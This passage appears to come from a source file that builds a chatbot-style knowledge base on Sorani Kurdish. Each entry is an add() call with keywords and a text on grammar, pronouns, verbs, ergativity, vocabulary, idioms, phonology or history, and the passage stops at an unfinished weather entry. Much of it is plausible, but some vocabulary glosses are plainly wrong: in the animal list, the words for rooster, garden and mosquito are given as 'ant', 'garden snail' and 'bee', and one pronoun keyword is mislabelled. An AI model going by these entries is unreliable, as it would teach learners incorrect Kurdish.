    'Sorani Kurdish grammar basics: Word order is SOV (Subject-Object-Verb), e.g., "من نان دەخۆم" (min nan daxom — "I bread eat" = "I eat bread"). Kurdish is ergative in past tense: the agent takes oblique case. Key features: 1) No grammatical gender, 2) Definite article is suffix "-ەکە" (-aka), 3) Indefinite is suffix "-ێک" (-êk), 4) Adjectives follow nouns with "ی" (ezafe): "کتێبی باش" (ktêbî bash — "good book"), 5) Postpositions instead of prepositions in many cases, 6) Verb at end of sentence.', 1.4)

  add('language', ['sorani pronouns', 'kurdish pronouns', 'ئاوەڵناوی کەسی'],
    'Sorani Kurdish personal pronouns (جێناوی کەسی): من (min — I/me), تۆ (to — you/singular), ئەو (aw — he/she/it — no gender distinction!), ئێمە (êma — we), ئێوە (êwa — you/plural), ئەوان (awan — they). Possessive suffixes: -م (-m — my), -ت (-t — your), -ی (-î — his/her/its), -مان (-man — our), -تان (-tan — your/pl), -یان (-yan — their). Example: ماڵم (maḷm — my house), ماڵت (maḷt — your house), ماڵی (maḷî — his/her house). Kurdish uses ezafe (ی) to connect possessor and possessed.', 1.3)

  add('language', ['sorani verbs', 'kurdish verbs', 'sorani conjugation', 'kurdish verb conjugation', 'کردار'],
    'Sorani Kurdish verb system (کردار): Verbs conjugate for person, number, tense, and mood. Present stem + prefixes: دە- (da-) for present/habitual, نا- (na-) for negative. Example with خواردن (xwardin — to eat): دەخۆم (daxom — I eat), دەخۆیت (daxoyt — you eat), دەخوات (daxwat — he/she eats), دەخۆین (daxoyn — we eat), دەخۆن (daxon — you/pl eat), دەخۆن (daxon — they eat). Past tense uses past stem: خواردم (xwardim — I ate). Subjunctive prefix: بـ (bi-). Continuous: prefix دە- (da-). Future: دە- + present stem.', 1.4)

  add('language', ['sorani tenses', 'kurdish tenses', 'sorani past tense', 'sorani present tense', 'sorani future tense'],
    'Sorani Kurdish tense system: 1) PRESENT SIMPLE: دە + stem — "دەنووسم" (danûsim — I write). 2) PRESENT CONTINUOUS: same form, context-dependent. 3) PAST SIMPLE: past stem + person suffix — "نووسیم" (nûsîm — I wrote). 4) PAST CONTINUOUS: دە + past stem — "دەمنووسی" (damnûsî — I was writing). 5) PRESENT PERFECT: past participle + auxiliary — "نووسیومە" (nûsîuma — I have written). 6) FUTURE: دە + present — "دەنووسم" (context: I will write). 7) SUBJUNCTIVE: بـ + stem — "بنووسم" (binûsim — that I write). IMPERATIVE: stem alone — "بنووسە!" (binûsa! — Write!).', 1.3)

  add('language', ['sorani ergativity', 'kurdish ergative', 'split ergativity', 'sorani past tense agreement'],
    'Sorani Kurdish has SPLIT ERGATIVITY: In present tense, the subject controls verb agreement (nominative-accusative pattern). In past tense with transitive verbs, the AGENT takes oblique case and the PATIENT controls verb agreement (ergative-absolutive pattern). Example: Present: "من تۆ دەبینم" (min to dabînim — I see you) — verb agrees with "من" (I). Past: "من تۆم بینی" (min tom bînî — I saw you) — literally "I you-I saw" — the -م suffix on تۆ cross-references the agent. This split ergativity is a key typological feature of Kurdish and related Iranian languages.', 1.3)

  add('language', ['sorani nouns', 'kurdish nouns', 'sorani plural', 'sorani definite', 'ناو'],
    'Sorani Kurdish nouns (ناو): Plurals: add -ان (-an) or -ەکان (-akan for definite): کتێب → کتێبەکان (ktêbakan — the books). Definite suffix: -ەکە (-aka — singular), -ەکان (-akan — plural). Indefinite: -ێک (-êk — a/one). Examples: پیاو (pyaw — man), پیاوێک (pyawêk — a man), پیاوەکە (pyawaka — the man), پیاوەکان (pyawakan — the men/the men). Demonstratives: ئەم (am — this), ئەو (aw — that). No grammatical gender in Sorani — all nouns are genderless. Case: direct (subject) and oblique (object/possessor).', 1.3)

  add('language', ['sorani adjectives', 'kurdish adjectives', 'sorani ezafe', 'ezafe', 'ئیزافە'],
    'Sorani Kurdish adjectives & Ezafe construction: Adjectives follow the noun, connected by the EZAFE particle "ی" (î): ماڵی گەورە (maḷî gawra — big house), کچی جوان (kchî jwan — beautiful girl), ئاوی سارد (awî sard — cold water). Comparative: -تر (-tir): گەورەتر (gawratir — bigger). Superlative: -ترین (-tirîn): گەورەترین (gawratirîn — biggest). Ezafe chains: ماڵی گەورەی سپی (maḷî gawray spî — big white house). The ezafe system is one of the most distinctive features of Kurdish grammar, inherited from Old Iranian.', 1.3)

  // ── Kurdish Sorani — Vocabulary & Common Words ────────────────────────────

  add('language', ['sorani greetings', 'kurdish greetings', 'sorani hello', 'kurdish hello', 'سڵاو'],
    'Kurdish Sorani greetings and basic phrases: سڵاو (slaw — hello/hi), چۆنیت؟ (chonît? — how are you?), باشم سوپاس (bashim supas — I\'m fine, thanks), سوپاس (supas — thank you), بەخێربێیت (baxêrbêyt — welcome), شەو باش (shaw bash — good night), ڕۆژ باش (roj bash — good morning/good day), خوا حافیز (xwa ḥafîz — goodbye), بەلێ (balê — yes), نەخێر (naxêr — no), تکایە (tikaya — please), ببوورە (bibûra — excuse me/sorry), لە کەرەمە (la karama — you\'re welcome).', 1.4)

  add('language', ['sorani numbers', 'kurdish numbers', 'sorani counting', 'ژمارە'],
    'Sorani Kurdish numbers (ژمارەکان): ١ یەک (yak — 1), ٢ دوو (dû — 2), ٣ سێ (sê — 3), ٤ چوار (chwar — 4), ٥ پێنج (pênj — 5), ٦ شەش (shash — 6), ٧ حەوت (hawt — 7), ٨ هەشت (hasht — 8), ٩ نۆ (no — 9), ١٠ دە (da — 10), ٢٠ بیست (bîst — 20), ٣٠ سی (sî — 30), ٤٠ چل (chil — 40), ٥٠ پەنجا (panja — 50), ١٠٠ سەد (sad — 100), ١٠٠٠ هەزار (hazar — 1000). Ordinals: یەکەم (yakam — first), دووەم (dûam — second), سێیەم (sêyam — third). Kurdish uses Eastern Arabic numerals: ٠١٢٣٤٥٦٧٨٩.', 1.3)

  add('language', ['sorani family', 'kurdish family words', 'sorani family members', 'خێزان'],
    'Sorani Kurdish family vocabulary (خێزان — xêzan — family): دایک (dayk — mother), باوک (bawk — father), برا (bra — brother), خوشک (xwshk — sister), کوڕ (kuṛ — son/boy), کچ (kch — daughter/girl), باپیر (bapîr — grandfather), داپیر (dapîr — grandmother), مام (mam — paternal uncle), خاڵ (xaḷ — maternal uncle), پور (pûr — paternal aunt), خاڵۆژن (xaḷojin — maternal aunt), هاوسەر (hawsar — spouse), مێرد (mêrd — husband), ژن (jin — wife/woman), منداڵ (mindaḷ — child).', 1.3)

  add('language', ['sorani colors', 'kurdish colors', 'ڕەنگ'],
    'Sorani Kurdish colors (ڕەنگەکان — rangakan): سوور (sûr — red), شین (shîn — blue/green — Kurdish traditionally uses one word for blue and green), زەرد (zard — yellow), سپی (spî — white), ڕەش (rash — black), پەمەیی (pamayî — orange), مۆر (mor — purple), قاوەیی (qawayî — brown), خۆڵەمێشی (xoḷamêshî — gray), گوڵی (guḷî — pink). Note: شین (shîn) covers both blue AND green in traditional usage; some speakers now distinguish: شینی ئاسمان (shînî asman — sky blue) vs سەوز (sawz — green, borrowed from Persian).', 1.2)

  add('language', ['sorani body parts', 'kurdish body', 'sorani anatomy', 'ئەندامی جەستە'],
    'Sorani Kurdish body parts (ئەندامی جەستە — andamî jasta): سەر (sar — head), چاو (chaw — eye), گوێ (gwê — ear), لووت (lût — nose), دەم (dam — mouth), ددان (ddan — tooth/teeth), زمان (zman — tongue/language), دەست (dast — hand/arm), پێ (pê — foot/leg), دڵ (diḷ — heart), ناو (naw — stomach/name), پشت (pisht — back), شان (shan — shoulder), ئەنگوست (angust — finger), سنگ (sing — chest), گەردن (gardin — neck), مێشک (mêshk — brain), قاچ (qach — leg).', 1.2)

  add('language', ['sorani food', 'kurdish food', 'sorani cuisine', 'خواردن'],
    'Sorani Kurdish food vocabulary (خواردنەوە — xwardinawa): نان (nan — bread — staple food), برنج (birnj — rice), گۆشت (gosht — meat), مریشک (mirishk — chicken), ماسی (masî — fish), سەوزە (sawza — vegetables), میوە (mîwa — fruit), شیر (shîr — milk), پەنیر (panîr — cheese), ماست (mast — yogurt), چا (cha — tea — very important!), ئاو (aw — water), شۆربا (shorba — soup), کەباب (kabab — kebab), دۆڵمە (doḷma — dolma/stuffed vegetables), کوبە (kuba — kubba). Kurdish cuisine is rich with grilled meats, rice dishes, and fresh herbs.', 1.2)

  add('language', ['sorani time', 'kurdish time', 'sorani days', 'sorani months', 'ڕۆژانی هەفتە'],
    'Sorani Kurdish time words: Days (ڕۆژانی هەفتە): شەممە (shamma — Saturday), یەکشەممە (yakshamma — Sunday), دووشەممە (dûshamma — Monday), سێشەممە (sêshamma — Tuesday), چوارشەممە (chwarshamma — Wednesday), پێنجشەممە (pênjshamma — Thursday), هەینی (haynî — Friday). Seasons: بەهار (bahar — spring), هاوین (hawîn — summer), پاییز (payîz — autumn), زستان (zistan — winter). Time: ئێستا (êsta — now), دوێنێ (dwênê — yesterday), سبەینێ (sbaynê — tomorrow), سەعات (saʿat — hour), خولەک (xulak — minute).', 1.3)

  add('language', ['sorani nature', 'kurdish nature', 'sorani geography', 'سروشت'],
    'Sorani Kurdish nature vocabulary (سروشت — sirûsht — nature): چیا (chya — mountain), دەریا (darya — sea/lake), ڕووبار (rûbar — river), دارستان (daristan — forest), دار (dar — tree), گوڵ (guḷ — flower), ئاسمان (asman — sky), خۆر (xor — sun), مانگ (mang — moon), ئەستێرە (astêra — star), بەفر (bafr — snow), باران (baran — rain), با (ba — wind), زەمین (zamîn — earth/ground), کێو (kêw — mountain/hill), بەرد (bard — stone/rock), خاک (xak — soil/earth). Kurdistan is known for its beautiful mountains: "کوردستان وڵاتی چیایە" (Kurdistan is the land of mountains).', 1.2)

  // ── Kurdish Sorani — Sentence Construction & Semantics ────────────────────

  add('language', ['sorani sentence', 'kurdish sentence', 'sorani word order', 'sorani SOV', 'ڕستە'],
    'Sorani Kurdish sentence construction (ڕستە — rista): SOV word order. Simple sentence: SUBJECT + OBJECT + VERB. Examples: "من نان دەخۆم" (min nan daxom — I eat bread), "ئەو کتێب دەخوێنێتەوە" (aw ktêb daxwênêtawa — He/she reads a book), "ئێمە بۆ قوتابخانە دەچین" (êma bo qutabxana dachîn — We go to school). Questions: add "ئایا" (aya — question marker) or rising intonation: "تۆ کوردیت؟" (to kurdît? — Are you Kurdish?). Negation: prefix نا- (na-) or نە- (na-): "من نان ناخۆم" (min nan naxom — I don\'t eat bread).', 1.4)

  add('language', ['sorani prepositions', 'kurdish prepositions', 'sorani postpositions', 'ئامراز'],
    'Sorani Kurdish prepositions/postpositions: لە (la — in/at/from), بۆ (bo — for/to), لەگەڵ (lagaḷ — with), بەبێ (babê — without), لەسەر (lasar — on/about), لەژێر (lazhêr — under), لەپێش (lapêsh — before/in front of), لەدوای (ladway — after/behind), لەنێو (lanêw — inside/among), تا (ta — until), وەک (wak — like/as), لەبەر (labar — because of). Examples: "من لە ماڵ دام" (min la maḷ dam — I am at home), "بۆ تۆ" (bo to — for you), "لەگەڵ من" (lagaḷ min — with me).', 1.3)

  add('language', ['sorani question words', 'kurdish questions', 'sorani interrogative', 'پرسیار'],
    'Sorani Kurdish question words (وشەی پرسیار): کێ (kê — who), چی (chî — what), کوا (kwa — where), کەی (kay — when), چۆن (chon — how), بۆچی (bochî — why), چەند (chand — how many/how much), کام (kam — which). Examples: "ناوت چییە؟" (nawt chîya? — What is your name?), "لە کوێیت؟" (la kwêyt? — Where are you?), "کەی دێیت؟" (kay dêyt? — When will you come?), "بۆچی دواکەوتی؟" (bochî dwakawty? — Why are you late?), "چۆنیت؟" (chonît? — How are you?).', 1.3)

  add('language', ['sorani common phrases', 'kurdish phrases', 'sorani conversation', 'لێدوان'],
    'Essential Sorani Kurdish phrases for conversation: ناوم ... ە (nawm ... a — My name is ...), ناوت چییە؟ (nawt chîya? — What\'s your name?), زمانی کوردی دەزانیت؟ (zmanî kurdî dazanît? — Do you know Kurdish?), بەڵێ کەمێک (baḷê kamêk — Yes, a little), لە کوێوە دێیت؟ (la kwêwa dêyt? — Where are you from?), من ... م (min ... m — I am from ...), چەندە؟ (chanda? — How much does it cost?), یارمەتیم بدە (yarmatîm bda — Help me), تێناگەم (tênagam — I don\'t understand), هەڵە نییە (haḷa nîya — No problem).', 1.3)

  // ── Kurdish Sorani — Semantic & Linguistic Features ───────────────────────

  add('language', ['sorani semantics', 'kurdish semantics', 'sorani meaning', 'sorani linguistic features', 'واتاناسی'],
    'Kurdish Sorani semantic features (واتاناسی — watasanî): 1) POLYSEMY: شین (shîn) means both "blue" AND "green" AND "mourning." Context determines meaning. 2) SEMANTIC FIELDS: rich vocabulary for mountains, valleys, seasons — reflecting Kurdish geography. 3) METAPHOR: دڵ (diḷ — heart) used extensively: دڵشاد (diḷshad — happy, lit. heart-happy), دڵتەنگ (diḷtang — sad, lit. heart-tight), دڵسۆز (diḷsoz — compassionate, lit. heart-burning). 4) COMPOUND WORDS: highly productive — دەستکرد (dastkird — handmade), سەرکردە (sarkida — leader, lit. head-doer). 5) HONORIFICS: خان (xan), بەگ (bag) — social respect markers.', 1.4)

  add('language', ['sorani compound words', 'kurdish compounds', 'sorani word formation', 'وشەی لێکدراو'],
    'Sorani Kurdish compound word formation (وشەی لێکدراو): Kurdish creates rich meanings by combining words: سەرشاری (sarshary — overjoyed, lit. head-flooding), دڵنیا (diḷnya — confident, lit. heart-settled), دەستبەسەر (dastbasar — powerful, lit. hand-on-head), چاودێری (chawdêrî — supervision, lit. eye-watching), سەرقاڵ (sarqaḷ — busy, lit. head-occupied), پشتگیری (pishtgîrî — support, lit. back-holding), دەستپێکردن (dastpêkirdin — to begin, lit. hand-foot-doing), سەرچاوە (sarchawa — source, lit. head-of-spring). This productive compounding is a key feature of Kurdish semantics.', 1.3)

  add('language', ['sorani idioms', 'kurdish idioms', 'sorani expressions', 'ئیدیۆم'],
    'Sorani Kurdish idioms and expressions: دەستت خۆش بێت (dastt xosh bêt — thank you, lit. "may your hand be happy"), چاوت ڕۆشن (chawt roshn — congratulations, lit. "your eye is bright"), سەرت سەلامەت (sart salamat — may you be safe, lit. "your head safe"), لە دڵمەوە (la diḷmawa — sincerely, lit. "from my heart"), بەر لە بۆنەکانتان (bar la bonakantand — before your nose/in your presence), خوا لە گەڵت بێت (xwa la gaḷt bêt — God be with you), دەست و پێت نەرم بێت (dast û pêt narm bêt — good luck, lit. "may your hands and feet be soft").', 1.2)

  add('language', ['sorani phonology', 'kurdish sounds', 'sorani pronunciation', 'دەنگناسی'],
    'Sorani Kurdish phonology (دەنگناسی — dangnasî): Unique sounds: ڕ (rr — retroflex/trilled r, contrasts with ر plain r), ڵ (ḷḷ — velarized/dark l, contrasts with ل plain l), ڤ (v — labiodental fricative). Pharyngeal sounds: ح (ḥ) and ع (ʿ) retained from Arabic loans. Kurdish has 8 vowels (more than Arabic\'s 3): a, â, e, ê, i, î, o, û. Stress is generally on the last syllable. Consonant clusters are common word-initially: "دوو" (dû), "بران" (bran). Aspiration is not phonemic. Voicing contrasts: p/b, t/d, k/g, ch/j, f/v, s/z, sh/zh.', 1.3)

  add('language', ['sorani dialects', 'kurdish dialects', 'kurdish varieties', 'sorani vs kurmanji'],
    'Kurdish dialect diversity: SORANI (Central Kurdish) — written in Arabic script, SOV, no gender, spoken in Iraqi Kurdistan & western Iran. KURMANJI (Northern Kurdish) — written in Latin script, SOV, has grammatical gender (m/f), spoken in Turkey, Syria, northern Iraq. HAWRAMI (Gorani) — archaic features, spoken in Iran-Iraq border. SOUTHERN KURDISH — spoken in Kermanshah, Iran. Key Sorani-Kurmanji differences: Sorani has no gender (Kurmanji: jin/mêr), Sorani uses Arabic script (Kurmanji: Latin), Sorani has more analytic structure, Kurmanji preserves more case distinctions. All dialects are mutually somewhat intelligible but have significant grammatical differences.', 1.3)

  add('language', ['sorani history', 'kurdish language history', 'kurdish literature', 'مێژوو'],
    'Kurdish Sorani language history: Kurdish is an Indo-European language from the Northwestern Iranian branch, related to Persian but distinct. Key literary figures: Ahmad Khani (17th century, wrote "Mem and Zin"), Nali (19th century poet), Haji Qadir Koyi (modernist poet), Abdullah Goran (father of modern Kurdish poetry), Sherko Bekas (contemporary). Sorani became a written standard in the early 20th century. The Sulaymaniyah dialect became the literary standard. Kurdish was suppressed under Iraqi Ba\'ath regime (Anfal campaign). After 1991, Sorani became official in Kurdistan Region. Today it has TV channels, newspapers, universities, and a growing digital presence.', 1.2)

  add('language', ['learn sorani', 'learn kurdish', 'sorani for beginners', 'kurdish learning', 'فێربوون'],
    'How to learn Sorani Kurdish: 1) ALPHABET: Master the 33-letter Arabic-based script — start with vowels (ئا ئە ئێ ئی ئۆ ئوو), then consonants. 2) BASIC PHRASES: Greetings (سڵاو، چۆنیت؟), numbers (یەک تا دە), pronouns (من، تۆ، ئەو). 3) GRAMMAR: SOV word order, ezafe (ی) construction, verb conjugation with prefixes (دە-، نا-، بـ-). 4) VOCABULARY: Family, food, nature, body parts — build from daily life. 5) PRACTICE: Listen to Kurdish music/TV (Rudaw, KurdSat), speak with native speakers. 6) SEMANTICS: Learn compound words (دڵشاد، سەرقاڵ) — they reveal Kurdish worldview. 7) WRITING: Practice right-to-left, pay attention to unique Kurdish letters: ڕ، ڵ، ڤ.', 1.4)

  add('language', ['sorani verbs common', 'kurdish common verbs', 'sorani verb list', 'کرداری باو'],
    'Common Sorani Kurdish verbs (کرداری باو): هاتن (hatin — to come), چوون (chûn — to go), بوون (bûn — to be/become), هەبوون (habûn — to have/exist), خواردن (xwardin — to eat), خواردنەوە (xwardinawa — to drink), نووستن (nûstin — to sleep), خەوتن (xawtin — to sleep/fall asleep), دانیشتن (danîshtin — to sit), ڕاوەستان (rawestan — to stand/stop), زانین (zanîn — to know), توانین (twanîn — to be able), ویستن (wistin — to want), نووسین (nûsîn — to write), خوێندنەوە (xwêndinawa — to read), دیتن (dîtin — to see), بیستن (bîstin — to hear), گوتن (gutin — to say/tell), کردن (kirdin — to do/make), دان (dan — to give).', 1.3)

  add('language', ['sorani classroom', 'kurdish school', 'sorani education', 'قوتابخانە'],
    'Sorani Kurdish classroom/education vocabulary: قوتابخانە (qutabxana — school), مامۆستا (mamosta — teacher — highly respected title), قوتابی (qutabî — student), وانە (wana — lesson), کتێب (ktêb — book), قەڵەم (qaḷam — pen), دەفتەر (daftar — notebook), پۆل (poḷ — class/grade), تاقیکردنەوە (taqîkirdinawa — exam), فێربوون (fêrbûn — to learn), فێرکردن (fêrkirdin — to teach), زانکۆ (zanko — university), خوێندن (xwêndin — to study/read), زانست (zanist — science/knowledge), زمان (zman — language). Kurdish has a strong oral tradition: "زانین هێز ە" (zanîn hêz a — Knowledge is power).', 1.2)

  add('language', ['sorani emotions', 'kurdish emotions', 'sorani feelings', 'هەست'],
    'Sorani Kurdish emotion words (هەست — hast — feeling/emotion): خۆش (xosh — happy/pleasant), خەمبار (xambâr — sad), تۆقیو (toqyw — angry), ترسان (tirsan — scared/afraid), حەز کردن (ḥaz kirdin — to love/like), ئەوین (awîn — romantic love), ئومێد (umêd — hope), بێزار (bêzar — bored/fed up), شەرمەزار (sharmazar — ashamed), پەشیمان (pashîman — regretful), شاد (shad — joyful), دڵشاد (diḷshad — heart-happy), دڵتەنگ (diḷtang — heart-tight = anxious/sad), دڵگەرم (diḷgarm — heart-warm = encouraged), بیرەوەری (bîrawarî — nostalgia/memory). Emotions in Kurdish often use دڵ (heart) compounds.', 1.3)

  add('language', ['sorani politeness', 'kurdish respect', 'sorani honorifics', 'ڕێزداری'],
    'Sorani Kurdish politeness & respect (ڕێزداری — rêzdarî): Kurdish culture values respect deeply. Address forms: خان (xan — Ms./Mrs.), بەرێز (barêz — Mr./respected), مامۆستا (mamosta — teacher/scholar — can be used as honorific), کاک (kak — Mr./brother — polite male address), خاتوو (xatû — Mrs./Lady). Formal "you": in Sorani, ئێوە (êwa) can be used for polite singular (like French "vous"). Respect phrases: سەرچاو (sarchaw — sir/at your service), فەرموو (farmû — please/go ahead — very common), دەستت خۆش (dastt xosh — bless your hands). Elders are addressed first, offered seats, and served tea first.', 1.2)

  // ── Kurdish Sorani — Advanced Grammar ───────────────────────────────────

  add('language', ['sorani passive', 'kurdish passive voice', 'sorani passive voice', 'کاری نەکردە'],
    'Sorani Kurdish passive voice (کاری نەکردە): Formed by adding -را- (-ra-) or -ر- (-r-) infix to the verb stem + auxiliary. Examples: خواردن (xwardin — to eat) → خوراوە (xwrawa — was eaten), نووسین (nûsîn — to write) → نووسراوە (nûsrawa — was written), کردن (kirdin — to do) → کراوە (krawa — was done), کوشتن (kushtin — to kill) → کوژراوە (kuzhrawa — was killed). The agent is optionally expressed with لەلایەن (lalayen — by): "نامەکە لەلایەن من نووسراوە" (namaka lalayen min nûsrawa — The letter was written by me). Passive is less common than active in daily speech.', 1.3)

  add('language', ['sorani causative', 'kurdish causative', 'sorani causative verb', 'کاری هۆکاری'],
    'Sorani Kurdish causative verbs (کاری هۆکاری): Formed by adding -ێن- (-ên-) or -ان- (-an-) suffix to the stem. Examples: خواردن (xwardin — to eat) → خواردنەوە (xwardinawa — to feed/cause to eat), فێربوون (fêrbûn — to learn) → فێرکردن (fêrkirdin — to teach/cause to learn), نووستن (nûstin — to sleep) → نوساندن (nûsandin — to put to sleep), تێگەیشتن (têgayshtin — to understand) → تێگەیاندن (têgayandin — to explain/make understand), چوون (chûn — to go) → بردن (birdin — to take/cause to go). Causative adds agency: someone causes the action to happen.', 1.3)

  add('language', ['sorani relative clause', 'kurdish relative clause', 'sorani subordinate', 'بڕگەی تایبەتمەندی'],
    'Sorani Kurdish relative clauses (بڕگەی تایبەتمەندی): Formed with the relative marker "کە" (ka — that/which/who). Structure: NOUN + کە + CLAUSE. Examples: "پیاوەکەی کە هات" (pyawakay ka hat — the man who came), "کتێبەکەی کە خوێندمەوە" (ktêbakay ka xwêndimawa — the book that I read), "ماڵەکەی کە تێدا دەژیم" (maḷakay ka têda dazhîm — the house in which I live). "کە" is invariable — same form for subject, object, and oblique. Restrictive clauses immediately follow the noun. Non-restrictive uses a pause/comma.', 1.3)

  add('language', ['sorani conditional', 'kurdish if clause', 'sorani if then', 'مەرج'],
    'Sorani Kurdish conditionals (مەرج — marj): Real condition: "ئەگەر" (agar — if) + present/subjunctive: "ئەگەر بارانت ببارێت، ناچم" (agar barant bbarêt, nachim — If it rains, I won\'t go). Unreal/counterfactual: "ئەگەر" + past: "ئەگەر دەمزانی، دەمگوت" (agar damzanî, damgut — If I had known, I would have said). Wish: "خۆزگە" (xozga — I wish): "خۆزگە هاتبایت" (xozga hatbayt — I wish you had come). Temporal: "کاتێک" (katêk — when): "کاتێک گەیشت، دەستبکە" (katêk gaysht, dastbka — When you arrive, start). Concessive: "هەرچەندە" (harchand — although).', 1.3)

  add('language', ['sorani modal verbs', 'kurdish modal', 'sorani can should must', 'کرداری مۆداڵ'],
    'Sorani Kurdish modal verbs (کرداری مۆداڵ): ABILITY: توانین (twanîn — can/be able): "دەتوانم بنووسم" (datwanim binûsim — I can write). OBLIGATION: دەبێ/پێویستە (dabê/pêwista — must/should): "دەبێ بچم" (dabê bchim — I must go). DESIRE: ویستن (wistin — to want): "دەمەوێ بخوام" (damawê bxwam — I want to eat). PERMISSION: ئیجازە (îjaza — permission): "دەتوانم بچمە ژوور؟" (datwanim bchima zhûr? — May I go to the room?). PROBABILITY: لەوانەیە (lawanaya — maybe): "لەوانەیە ببارێت" (lawanaya bbarêt — It might rain). NECESSITY: پێویستە (pêwista — necessary): "پێویستە فێربیت" (pêwista fêrbît — You need to learn).', 1.3)

  add('language', ['sorani adverbs', 'kurdish adverbs', 'sorani ئاوەڵکار', 'sorani time place manner'],
    'Sorani Kurdish adverbs (ئاوەڵکار — awaḷkar): TIME: ئێستا (êsta — now), هەمیشە (hamîsha — always), هەرگیز (hargîz — never), زوو (zû — quickly/soon), درەنگ (drang — late), گاهێک (gahêk — sometimes). PLACE: ئێرە (êra — here), ئەوێ (awê — there), لەدەرەوە (ladarawa — outside), لەژوورەوە (lazhûrawa — inside). MANNER: باش (bash — well), خراپ (xrap — badly), بەخێرایی (baxêrayî — quickly), هێواش (hêwash — slowly/gently). DEGREE: زۆر (zor — very/much), کەم (kam — little), تەواو (tawaw — completely). Adverbs precede the verb: "زۆر باش دەزانم" (zor bash dazanim — I know very well).', 1.2)

  add('language', ['sorani conjunctions', 'kurdish conjunctions', 'sorani linking words', 'بەستنەوە'],
    'Sorani Kurdish conjunctions (بەستنەوە — bastnawa): COORDINATING: و (w/û — and), یان (yan — or), بەڵام (baḷam — but), نە...نە (na...na — neither...nor). SUBORDINATING: چونکە (chunka — because), کە (ka — that/when), بۆئەوەی (bo away — so that/in order to), هەرچەندە (harchand — although), پێش ئەوەی (pêsh away — before), دوای ئەوەی (dway away — after), لە کاتێکدا (la katêkda — while). CORRELATIVE: هەم...هەم (ham...ham — both...and), یان...یان (yan...yan — either...or). Examples: "هاتم و دانیشتم" (hatim û danîshtim — I came and sat), "بەڵام ناتوانم" (baḷam natwanim — but I can\'t).', 1.2)

  add('language', ['sorani negation', 'kurdish negation', 'sorani negative', 'نەرێ'],
    'Sorani Kurdish negation (نەرێ — narê): Present tense: replace دە- with نا-: "ناخۆم" (naxom — I don\'t eat), "نازانم" (nazanim — I don\'t know). Past tense: prefix نە-: "نەمخوارد" (namxward — I didn\'t eat). Subjunctive: prefix نە-: "نەخۆم" (naxom — that I don\'t eat). Imperative negative: prefix مە-: "مەچۆ!" (macho! — Don\'t go!). Existential negative: نییە (nîya — is not), نین (nîn — are not): "ئەو لێرە نییە" (aw lêra nîya — He/she is not here). Double negative emphatic: "هیچ نازانم" (hîch nazanim — I don\'t know anything at all).', 1.3)

  add('language', ['sorani aspect', 'kurdish aspect', 'sorani progressive', 'sorani habitual', 'ئاسپێکت'],
    'Sorani Kurdish verb aspect system: HABITUAL: prefix دە- indicates repeated/habitual action: "دەخۆم" (daxom — I eat [regularly]). PROGRESSIVE/CONTINUOUS: context distinguishes: "ئێستا دەخۆم" (êsta daxom — I am eating [right now]). PERFECTIVE: simple past without prefix: "خواردم" (xwardim — I ate [completed]). IMPERFECTIVE: past with دە-: "دەمخوارد" (damxward — I was eating/used to eat). PERFECT: past participle + copula: "خواردوومە" (xwardûma — I have eaten). PROSPECTIVE: implied by context + دە-: "سبەی دەچم" (sbay dachim — I\'m going tomorrow). Aspect interacts with tense to create nuanced meanings.', 1.3)

  add('language', ['sorani clitic', 'kurdish clitic pronouns', 'sorani bound pronouns', 'کلیتیک'],
    'Sorani Kurdish clitic pronoun system: Bound pronouns attach to verbs, prepositions, and nouns: -م (-m — me/my/I), -ت (-t — you/your), -ی (-î — him/her/his/her/its), -مان (-man — us/our/we), -تان (-tan — you/your/pl), -یان (-yan — them/their/they). Position: after the first stressed element. On verbs: "بینیم" (bînim — I saw [ergative: me-saw]), on prepositions: "لێم" (lêm — from me), "پێت" (pêt — to you), on nouns: "کتێبم" (ktêbim — my book). Clitic doubling: "من بینیم" (min bînim — I, I-saw). Clitics are fundamental to Kurdish syntax and ergativity.', 1.3)

  add('language', ['sorani word order variations', 'kurdish topic focus', 'sorani focus', 'ڕیزبەندی وشە'],
    'Sorani Kurdish word order and information structure: Base order is SOV but varies for emphasis. TOPIC-fronting: "کتێبەکە، خوێندمەوە" (ktêbaka, xwêndimawa — The book, I read it). FOCUS: new/contrastive info moves before verb: "من نان دەخۆم نەک برنج" (min nan daxom nak birnj — I eat BREAD not rice). WH-movement: question words move to pre-verbal position: "تۆ چی دەخۆیت؟" (to chî daxoyt? — What do you eat?). SCRAMBLING: free word order with clitics tracking relations: "نان من دەخۆم" or "من دەخۆم نان" both valid. Heavy NPs shift right.', 1.3)

  // ── Kurdish Sorani — Advanced Vocabulary Domains ────────────────────────

  add('language', ['sorani professions', 'kurdish jobs', 'sorani occupations', 'پیشە'],
    'Sorani Kurdish professions (پیشە — pîsha): پزیشک (pzîshk — doctor), پەرستار (parstar — nurse), ئەندازیار (andazyar — engineer), وەکیل (wakîl — lawyer), مامۆستا (mamosta — teacher), حاکم (ḥakim — judge), ئەفسەر (afsar — officer), جوتیار (jutyar — farmer), تاجر (tajir — merchant), نانەوا (nanawa — baker), دەستکار (dastkar — craftsman/artisan), خاوەنکار (xawankar — employer), کرێکار (krêkar — worker/laborer), ژمێریار (zhmêryar — accountant), سەرباز (sarbaz — soldier), ڕۆژنامەنووس (rozhamanûs — journalist), هونەرمەند (hunarmand — artist), وەرزشوان (warzshwan — athlete).', 1.2)

  add('language', ['sorani animals', 'kurdish animals', 'sorani animal names', 'ئاژەڵ'],
    'Sorani Kurdish animal vocabulary (ئاژەڵ — azhaḷ — animal): سەگ (sag — dog), پشیلە (pshîla — cat), ئەسپ (asp — horse), مانگا (manga — cow), مەڕ (maṛ — sheep), بزن (bizin — goat), کەر (kar — donkey), هێشتر (hêshtir — camel), شێر (shêr — lion), ورچ (wurch — bear), گورگ (gurg — wolf), هەڵۆ (haḷo — eagle), کەوک (kawk — partridge), ماسی (masî — fish), مار (mar — snake), مێشوولە (mêshûla — bee), مەلەوانکە (malawanka — butterfly), کەلەشێر (kalashêr — ant), باخچە (bakhcha — garden snail). Kurdish has rich animal vocabulary reflecting pastoral culture.', 1.2)

  add('language', ['sorani weather', 'kurdish weather', 'sorani climate', 'کەشوهەوا'],
